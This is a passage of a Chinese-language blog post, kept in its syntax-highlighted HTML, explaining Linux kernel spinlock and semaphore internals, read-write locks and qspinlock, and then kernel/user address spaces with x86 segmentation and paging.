punctuation">,</span> _RET_IP_<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// real work done here（do_raw_spin_lock(lock)）</span><span class="token function">LOCK_CONTENDED</span><span class="token punctuation">(</span>lock<span class="token punctuation">,</span> do_raw_spin_trylock<span class="token punctuation">,</span> do_raw_spin_lock<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">LOCK_CONTENDED</span><span class="token punctuation">(</span>_lock<span class="token punctuation">,</span> try<span class="token punctuation">,</span> lock<span class="token punctuation">)</span> </span><span class="token punctuation">\</span><span class="token expression"><span class="token function">lock</span><span class="token punctuation">(</span>_lock<span class="token punctuation">)</span></span></span><span class="token keyword">void</span> <span class="token function">do_raw_spin_lock</span><span class="token punctuation">(</span>raw_spinlock_t <span class="token operator">*</span>lock<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">debug_spin_lock_before</span><span class="token punctuation">(</span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">arch_spin_lock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>lock<span class="token operator">-&gt;</span>raw_lock<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">debug_spin_lock_after</span><span class="token punctuation">(</span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre> <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">void</span> <span class="token function">arch_spin_lock</span><span class="token punctuation">(</span>arch_spinlock_t <span class="token operator">*</span>lock<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> tmp<span class="token punctuation">;</span>u32 newval<span class="token punctuation">;</span>arch_spinlock_t lockval<span class="token punctuation">;</span><span class="token function">prefetchw</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>lock<span class="token operator">-&gt;</span>slock<span class="token punctuation">)</span><span class="token punctuation">;</span>__asm__ <span class="token function">__volatile__</span><span class="token punctuation">(</span><span class="token string">"1:ldrex%0, [%3]\n"</span><span class="token string">"add%1, %0, %4\n"</span><span class="token string">"strex%2, %1, [%3]\n"</span><span class="token string">"teq%2, #0\n"</span><span class="token string">"bne1b"</span><span class="token operator">:</span> <span class="token string">"=&amp;r"</span> <span class="token punctuation">(</span>lockval<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=&amp;r"</span> <span class="token punctuation">(</span>newval<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=&amp;r"</span> <span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token string">"r"</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>lock<span class="token operator">-&gt;</span>slock<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"I"</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> TICKET_SHIFT<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token string">"cc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>lockval<span class="token punctuation">.</span>tickets<span class="token punctuation">.</span>next <span class="token operator">!=</span> lockval<span class="token punctuation">.</span>tickets<span class="token punctuation">.</span>owner<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">wfe</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//进入一小段时间等待状态，忙等但尽量让cpu进去low power mode</span>        <span class="token comment">//参考：https://www.cnblogs.com/sky-heaven/p/12926376.html</span>        lockval<span class="token punctuation">.</span>tickets<span class="token punctuation">.</span>owner <span class="token operator">=</span> <span class="token function">ACCESS_ONCE</span><span class="token punctuation">(</span>lock<span class="token operator">-&gt;</span>tickets<span class="token punctuation">.</span>owner<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">smp_mb</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><ol><li>由于slock与tickets共享同一块内存（union），slock占32位4字节，tickets内部变量next与owner各16位2字节，以大端序为例，slock 高2字节与next共享，低2字节与owner共享，因此实际上是将<code>tickets.next</code>+1</li><li>通过wfe指令进入一小段时间等待状态后读取新的owner值检查与next是否相等，不等则继续等待，相等则结束等待</li><li>owner的值由arch_spin_unlock控制，当next==owner时，释放锁，否则进入循环等待</li></ol><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220113-spinlock-flow-chart.png" alt="流程图"></p></blockquote></li></ul><h3 id="semaphore">semaphore</h3><h4 id="使用-3">使用</h4><ul><li><p>进程在信号量保护的临界区代码里是可以睡眠的，这是和自旋锁的最大的区别</p></li><li><p>Linux中的信号量能保证资源在一个时刻只有一个进程使用，这是单值信号量，也可以作为资源计数器，这是多值信号量</p></li><li><p>使用示例</p> <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">semaphore</span> sema<span class="token punctuation">;</span> <span class="token comment">//信号量</span><span class="token keyword">int</span> open_count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">int</span> <span class="token function">hello_open</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>p<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>f<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">down</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sema<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//上锁</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>open_count <span class="token operator">&gt;=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">up</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sema<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"dev is busy, hello_open fail\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">-</span>EBUSY<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    open_count<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token function">up</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sema<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"hello_open\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">hello_close</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>inode<span class="token punctuation">,</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>flip<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>open_count <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"hello_close fail\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">-</span>EBUSY<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    open_count<span class="token operator">--</span><span class="token punctuation">;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"hello_close ok\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">int</span> <span class="token function">hello_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token function">sema_init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sema<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//初始化</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>测试</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20211128-test.png" alt=""></p></li></ul><h4 id="内核源码实现">内核源码实现</h4><ul><li><p>semaphore 结构体</p> <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">semaphore</span> <span class="token punctuation">{</span>raw_spinlock_tlock<span class="token punctuation">;</span> <span class="token comment">//保护信号量自身的自旋锁</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span>count<span class="token punctuation">;</span> <span class="token comment">//信号量值</span><span class="token keyword">struct</span> <span class="token class-name">list_head</span>wait_list<span class="token punctuation">;</span> <span class="token comment">//挂载睡眠等待进程的双向链表</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>初始化函数（include/linux/semaphore.h）</p> <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">__SEMAPHORE_INITIALIZER</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> n<span class="token punctuation">)</span></span><span class="token punctuation">\</span><span class="token expression"><span class="token punctuation">{</span></span><span class="token punctuation">\</span><span class="token expression"><span class="token punctuation">.</span>lock<span class="token operator">=</span> <span class="token function">__RAW_SPIN_LOCK_UNLOCKED</span><span class="token punctuation">(</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span>lock<span class="token punctuation">)</span><span class="token punctuation">,</span></span><span class="token punctuation">\</span><span class="token expression"><span class="token punctuation">.</span>count<span class="token operator">=</span> n<span class="token punctuation">,</span></span><span class="token punctuation">\</span><span class="token expression"><span class="token punctuation">.</span>wait_list<span class="token operator">=</span> <span class="token function">LIST_HEAD_INIT</span><span class="token punctuation">(</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span>wait_list<span class="token punctuation">)</span><span class="token punctuation">,</span></span><span class="token punctuation">\</span><span class="token comment">//LIST_HEAD_INIT 初始化双向链表</span></span><span class="token punctuation">}</span><span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">void</span> <span class="token function">sema_init</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">semaphore</span> <span class="token operator">*</span>sem<span class="token punctuation">,</span> <span class="token keyword">int</span> val<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">lock_class_key</span> __key<span class="token punctuation">;</span><span class="token operator">*</span>sem <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">semaphore</span><span class="token punctuation">)</span> <span class="token function">__SEMAPHORE_INITIALIZER</span><span class="token punctuation">(</span><span class="token operator">*</span>sem<span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">lockdep_init_map</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sem<span class="token operator">-&gt;</span>lock<span class="token punctuation">.</span>dep_map<span class="token punctuation">,</span> <span class="token string">"semaphore-&gt;lock"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>__key<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>down（kernel/locking/semaphore.c）</p> <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//获取信号量</span><span class="token keyword">void</span> <span class="token function">down</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">semaphore</span> <span class="token operator">*</span>sem<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> flags<span class="token punctuation">;</span>    <span class="token comment">//对信号量本身加锁并关中断，必须另一段代码也在操作该信号量</span><span class="token function">raw_spin_lock_irqsave</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sem<span class="token operator">-&gt;</span>lock<span class="token punctuation">,</span> flags<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//自旋锁保护</span>    <span class="token comment">//信号量不够，休眠进程并把task加到sem的wait_list上</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">likely</span><span class="token punctuation">(</span>sem<span class="token operator">-&gt;</span>count <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sem<span class="token operator">-&gt;</span>count<span class="token operator">--</span><span class="token punctuation">;</span><span class="token comment">//如果信号量值大于0,则对其减1</span><span class="token keyword">else</span><span class="token function">__down</span><span class="token punctuation">(</span>sem<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//信号量不够，让当前进程进入睡眠</span><span class="token function">raw_spin_unlock_irqrestore</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sem<span class="token operator">-&gt;</span>lock<span class="token punctuation">,</span> flags<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre> <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//进入睡眠等待</span><span class="token keyword">static</span> noinline <span class="token keyword">void</span> __sched <span class="token function">__down</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">semaphore</span> <span class="token operator">*</span>sem<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">__down_common</span><span class="token punctuation">(</span>sem<span class="token punctuation">,</span> TASK_UNINTERRUPTIBLE<span class="token punctuation">,</span> MAX_SCHEDULE_TIMEOUT<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//#define TASK_UNINTERRUPTIBLE2 //进程状态为不可中断的睡眠状态</span>    <span class="token comment">//#defineMAX_SCHEDULE_TIMEOUTLONG_MAX</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre> <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">int</span> __sched <span class="token function">__down_common</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">semaphore</span> <span class="token operator">*</span>sem<span class="token punctuation">,</span> <span class="token keyword">long</span> state<span class="token punctuation">,</span><span class="token keyword">long</span> timeout<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">struct</span> <span class="token class-name">task_struct</span> <span class="token operator">*</span>task <span class="token operator">=</span> current<span class="token punctuation">;</span> <span class="token comment">//表示当前进程</span>    <span class="token comment">/**    struct semaphore_waiter {struct list_head list;struct task_struct *task;bool up;};    **/</span><span class="token keyword">struct</span> <span class="token class-name">semaphore_waiter</span> waiter<span class="token punctuation">;</span>    <span class="token comment">//将这个信号量上等待的task加到sem-&gt;wait_list的头部</span><span class="token function">list_add_tail</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>waiter<span class="token punctuation">.</span>list<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sem<span class="token operator">-&gt;</span>wait_list<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//链表相加</span>waiter<span class="token punctuation">.</span>task <span class="token operator">=</span> task<span class="token punctuation">;</span> waiter<span class="token punctuation">.</span>up <span class="token operator">=</span> false<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">signal_pending_state</span><span class="token punctuation">(</span>state<span class="token punctuation">,</span> task<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">//有没有打断</span><span class="token keyword">goto</span> interrupted<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span>timeout <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">//有没有超时</span><span class="token keyword">goto</span> timed_out<span class="token punctuation">;</span>        <span class="token comment">//设置当前进程的状态，进程睡眠，即先前__down函数中传入的TASK_UNINTERRUPTIBLE</span><span class="token function">__set_task_state</span><span class="token punctuation">(</span>task<span class="token punctuation">,</span> state<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">raw_spin_unlock_irq</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sem<span class="token operator">-&gt;</span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//释放在down函数中加的锁</span>        <span class="token comment">/** 为什么这里要分开上锁？**/</span>timeout <span class="token operator">=</span> <span class="token function">schedule_timeout</span><span class="token punctuation">(</span>timeout<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//进入睡眠，让出CPU</span><span class="token function">raw_spin_lock_irq</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sem<span class="token operator">-&gt;</span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//进程下次运行会回到这里，所以要加锁</span><span class="token keyword">if</span> <span class="token punctuation">(</span>waiter<span class="token punctuation">.</span>up<span class="token punctuation">)</span> <span class="token comment">//跳出循环</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>up</p> <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//释放信号量</span><span class="token keyword">void</span> <span class="token function">up</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">semaphore</span> <span class="token operator">*</span>sem<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> flags<span class="token punctuation">;</span>    <span class="token comment">//对信号量本身加锁并关中断，必须另一段代码也在操作该信号量</span><span class="token function">raw_spin_lock_irqsave</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sem<span class="token operator">-&gt;</span>lock<span class="token punctuation">,</span> flags<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">likely</span><span class="token punctuation">(</span><span class="token function">list_empty</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sem<span class="token operator">-&gt;</span>wait_list<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">//wait_list是否为空</span>sem<span class="token operator">-&gt;</span>count<span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">//如果信号量等待链表中为空，则对信号量值加1</span><span class="token keyword">else</span> <span class="token function">__up</span><span class="token punctuation">(</span>sem<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//否则执行唤醒进程相关的操作</span><span class="token function">raw_spin_unlock_irqrestore</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sem<span class="token operator">-&gt;</span>lock<span class="token punctuation">,</span> flags<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre> <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> noinline <span class="token keyword">void</span> __sched <span class="token function">__up</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">semaphore</span> <span class="token operator">*</span>sem<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">/** wait_list上有等待的进程把它拿下来唤醒**/</span><span class="token keyword">struct</span> <span class="token class-name">semaphore_waiter</span> <span class="token operator">*</span>waiter <span class="token operator">=</span> <span class="token function">list_first_entry</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sem<span class="token operator">-&gt;</span>wait_list<span class="token punctuation">,</span><span class="token keyword">struct</span> <span class="token class-name">semaphore_waiter</span><span class="token punctuation">,</span> list<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">list_del</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>waiter<span class="token operator">-&gt;</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将semaphore_waiter拿出来</span>waiter<span class="token operator">-&gt;</span>up <span class="token operator">=</span> true<span class="token punctuation">;</span> <span class="token comment">//置为true</span><span class="token function">wake_up_process</span><span class="token punctuation">(</span>waiter<span class="token operator">-&gt;</span>task<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//唤醒进程</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="rw-spinlock">rw spinlock</h3><ul><li><p>读写锁也称为共享-独占（shared-exclusive）锁，当读写锁用读取模式加锁时，它是以共享模式上锁的，当以写入修改模式加锁时，它是以独占模式上锁的（互斥），读写之间是互斥的，而且读取和写入操作在竞争锁的时候，写会优先得到锁</p></li><li><p>读写锁非常适合读取数据的频率远大于修改数据的频率的场景中，这样可以在任何时刻，保证多个进程的读取操作并发地执行，给系统带来了更高的并发度</p></li><li><p>Linux中的读写锁本质上是自旋锁的变种，Linux读写锁的原理<strong>本质是基于计数器</strong>，初始值为<code>0x01000000</code>，获取读锁时对其减1，结果不小于0则表示获取读锁成功；获取写锁时直接减去<code>0x01000000</code>，因为只有当锁值为初始值时，减去初始值结果才可以是0，这是唯一没有进程持有任何锁的情况，这样才能保证获取写锁时是互斥的<sup class="footnote-ref"><a href="#fn8" id="fnref8">[8]</a></sup></p></li></ul><h3 id="qspinlock">qspinlock</h3><ul><li>ticket spinlock的问题：不可伸缩性</li><li>Linux内核 4.2 引入了 qspinlock<sup class="footnote-ref"><a href="#fn9" id="fnref9">[9]</a></sup>，主要基于 mcs spinlock 的设计思想，解决了其接口不一致或空间太大的问题</li><li><a href="https://zhuanlan.zhihu.com/p/440837507">https://zhuanlan.zhihu.com/p/440837507</a></li></ul><h3 id="同步机制的比较">同步机制的比较</h3><ul><li><p>信号量的特点</p><ul><li>用于进程和进程之间的同步</li><li>允许有多个进程进入临界区代码执行</li><li>进程获取不到信号量锁会陷入休眠，并让出CPU</li><li><strong>被信号量锁保护的临界区代码允许睡眠</strong></li><li>本质是基于进程调度器，UP和SMP下的实现无差异</li><li><strong>不支持进程和中断之间的同步</strong></li></ul></li><li><p>自旋锁的特点</p><ul><li>是一种<strong>死等</strong>的锁机制</li><li>一次只能有一个执行单元获取锁并进入临界区，其它的执行单元都是在门口不断死等</li><li>执行时间短</li><li><strong>可以在中断上下文执行</strong>（中断上下文代码不允许睡眠，也不允许调用可能会引起睡眠的函数）</li><li>spinlock不区分reader和writer，对于那些读写强度不对称的是不适合的</li></ul></li><li><p>读写自旋锁</p><ul><li>自旋锁的改进，rw spinlock给reader赋予了更高的优先级</li></ul></li><li><p>顺序锁 seqlock</p><ul><li>seqlock 给writer赋予了更高的优先级</li></ul><blockquote><p>spin lock的不足：性能问题</p><p>rw spin lcok、spin lock和seqlock，它们都是基于一个remory中的共享变量（对该变量的访问是原子的）</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220113-spinlock-performance.png" alt=""></p></blockquote></li><li><p>rcu</p><ul><li>基于multi-processor之间的共享counter的锁机制已经不能满足性能的需求，在这种情况下rcu机制应运而生</li></ul></li></ul><ol><li></li></ol><h2 id="04-内存地址空间">04 | 内存地址空间</h2><h3 id="内核空间和用户空间">内核空间和用户空间</h3><ul><li><p>32位 linux 系统的地址空间分布</p><p>操作系统分配给每个进程一个独立的、连续的、虚拟的地址内存空间<sup class="footnote-ref"><a href="#fn10" id="fnref10">[10]</a></sup></p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20211117-memory-space.png" alt=""></p></li><li><p>逻辑地址、虚拟地址、线性地址、物理地址<sup class="footnote-ref"><a href="#fn11" id="fnref11">[11]</a></sup><sup class="footnote-ref"><a href="#fn12" id="fnref12">[12]</a></sup></p></li><li><p>linux 内核划分内核空间和用户空间的原因</p><ul><li><p><strong>安全考量</strong>：系统中有各种资源，而linux是多用户、多进程系统，所以这些资源必须在受限的、被管理的状态下使用，空间隔离可以保证即便是单个应用程序出现错误也不会影响到操作系统的稳定性</p></li><li><p><strong>处理器模式不同，权限不同</strong>：内核空间和用户空间代码运行时的处理器工作模式是不同的，用户模式只能正常执行程序，而特权模式才能访问外设、处理中断等</p></li><li><p>对于x86体系的cpu， 用户空间代码运行在Ring3，内核空间代码运行Ring0</p></li><li><p>对于arm体系的cpu，用户空间代码运行在usr模式，内核空间代码运行在svc模式</p></li><li><p><strong>核心代码和业务代码的解耦</strong>：内核代码偏重于系统和资源管理，而用户空间代码偏重于业务逻辑代码的实现，两者分工不同，隔离也是解耦</p></li></ul></li><li><p>64位系统的内核空间和用户空间的地址分布</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20211119-64-os.png" alt=""></p><ul><li>64位系统的地址线有64位，一般来说48位的地址线就够了，比如armv8-A，高64TB是内核空间，低64TB是用户空间</li><li>内核空间的的高16位都是1，用户空间的低16位都是0，这样可以方便的对用户空间和内核空间进行有效性检测，防止越界</li></ul></li></ul><h3 id="x86段页式内存管理">x86段页式内存管理</h3><ul><li><p><a href="https://night-candle.github.io/2021/01/28/hello-os/#MMU">MMU</a></p></li><li><p>逻辑地址到物理地址的转换（32位）</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20211120-x86cpu-mm.png" alt="x86 cpu 段页式内存管理机制"></p></li><li><p>分段 <code>Segmentation</code></p><p>逻辑地址转换为线性地址的过程：</p><p>（1）先从段选择符中得到段描述符</p><p>（2）从段描述符中得到段基地址</p><p>（3）线性地址=段基地址 + 段内偏移</p></li><li><p>分页 <code>Paging</code></p><p>线性地址转换成物理地址通过页表映射实现，以<a href="https://night-candle.github.io/2021/01/28/hello-os/#4KB%E9%A1%B5">保护模式下4KB页</a>（二级页表）为例，线性地址分成三段，用前两段分别作为索引去查表，根据页表项（Page Table Entry）获得一个物理内存块的起始地址（物理内存编号），加上页内偏移就得到了物理地址<sup class="footnote-ref"><a href="#fn13" id="fnref13">[13]</a></sup></p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20211128-paging.png" alt=""></p></li><li><p>Linux 内核中逻辑地址、虚拟地址和线性地址的关系</p><ul><li><p>Intel 的设计中段式内存管理中的段类型分为三种：代码段、数据段、系统段，但只靠页式内存管理就已经可以完成 Linux 内核需要的所有功能，所以 Linux 内核将所有类型的段的 segment base address 都设成 0 。由于段限长是地址总线的寻址限度，所以所有段内空间跟整个线性空间重合了，逻辑地址也就简化为了段内的偏移量</p></li><li><p>所以在 x86 linux 内核里，<strong>逻辑地址 = 虚拟地址 = 线性地址</strong></p></li></ul></li></ul><h3 id="内核空间和用户空间数据拷贝">内核空间和用户空间数据拷贝</h3><ol><li><p>内核空间和用户空间</p></li><li><p>驱动代码</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/module.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/moduleparam.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/cdev.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/fs.h&gt;</span></span><span class="token macro property"><span class="token 